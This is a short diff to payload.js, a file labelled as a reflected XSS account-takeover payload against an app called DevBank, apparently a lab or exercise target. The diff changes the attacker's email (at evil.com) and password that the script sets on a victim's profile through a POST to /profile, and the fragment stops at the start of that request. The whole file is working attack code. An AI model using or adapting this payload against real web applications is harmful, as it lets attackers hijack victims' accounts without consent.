@@ -1,8 +1,8 @@
 // payload.js - Reflected XSS account takeover for DevBank
 (function () {
   // modify the email and password of victim
-  const newEmail = "hacked@evil.com";
-  const newPassword = "pwned123";
+  const newEmail = "jche0685@evil.com";
+  const newPassword = "jche0685pwd";
 
   fetch("/profile", {
     method: "POST",
